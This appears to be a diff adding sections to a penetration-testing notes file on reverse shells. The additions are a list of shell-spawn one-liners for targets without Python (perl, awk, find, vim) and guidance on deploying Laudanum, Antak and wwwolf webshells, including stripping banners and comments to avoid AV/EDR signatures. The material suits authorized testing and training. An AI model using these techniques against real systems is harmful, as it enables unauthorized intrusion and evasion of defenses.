@@ -35,8 +35,6 @@ Attacker                         Target
 
 ---
 
-## Methodology
-
 ### Listeners
 
 **netcat:**
@@ -403,3 +401,60 @@ script above already clears the on-execute scan. See also [[windows-amsi-bypass]
 memory-patch route when AMSI (not the file signature) is the blocker.
 
 <!-- promoted-slug: ps-revshell-defender-evasion -->
+
+## Interactive shell without Python (fallback spawn ladder)
+
+Python missing on the target? `sudo -l`, `su`, and anything reading a password silently return
+nothing in a non-tty shell, so upgrade before privesc enumeration. Try in order (replace
+`/bin/sh` with whatever interpreter exists on the box):
+
+```bash
+/bin/sh -i                                    # bare interactive invocation
+perl -e 'exec "/bin/sh";'                     # perl present
+ruby -e 'exec "/bin/sh"'                      # ruby present
+awk 'BEGIN {system("/bin/sh")}'               # awk is on nearly every UNIX
+find . -exec /bin/sh \; -quit                 # find -exec runs the shell directly
+find / -name anything -exec /usr/bin/awk 'BEGIN {system("/bin/sh")}' \;   # find + awk combo
+```
+
+Vim route when an editor is present:
+
+```bash
+vim -c ':!/bin/sh'          # launch shell directly
+# or inside an open vim session:
+:set shell=/bin/sh
+:shell
+```
+
+Every command above needs only stock base-system binaries; the meterpreter `shell` command drops
+into the same non-tty state, so this ladder applies there too. Full pty upgrade steps
+(`pty.spawn` + `stty raw -echo`) stay in the TTY Upgrade section above.
+
+<!-- promoted-slug: tty-spawn-no-python -->
+
+## Maintained webshell toolkits (Laudanum, Antak, wwwolf)
+
+Skip hand-rolled shells when a maintained one fits; Kali bundles all three:
+
+- **Laudanum** (`/usr/share/laudanum/`): ready-made aspx/php/jsp shells plus Misc wrappers. Copy
+  out of the read-only dir, then edit the `allowedIps` array inside the file to the attack IP
+  before uploading, or the shell refuses your requests. Read the per-file comments first;
+  they state required edits per variant.
+- **Antak** (`/usr/share/nishang/Antak-WebShell/antak.aspx`): an ASP.NET webshell themed as a
+  PowerShell console. Set the username/password check near the top of the file so passers-by
+  cannot use it. Each command runs as a fresh process; buttons give in-memory
+  encode-and-execute, file upload/download, `web.config` parsing, and SQL query execution
+  against a supplied connection string. Good fit for IIS hosts.
+- **wwwolf-php-webshell**: single-file PHP shell with a browser UI (file fetch, command exec,
+  upload); save the source as a `.php` file for classic LAMP targets.
+
+**Signature hygiene before upload:** strip the ASCII-art banners and author comments these
+shells ship with; both are common AV/EDR signature anchors. Set the built-in auth gate
+(allowedIps / credential pair) so the shell is not usable by anyone who finds it.
+
+**Lifecycle:** a webshell is a stepping stone, not a home. Apps sometimes auto-purge uploads,
+chained commands (`whoami && hostname`) often fail, and every request lands in access logs.
+Swap to a reverse shell promptly, delete the shell file, and record its sha1/MD5 plus upload
+path as evidence for the report.
+
+<!-- promoted-slug: webshell-toolkits-laudanum-antak -->
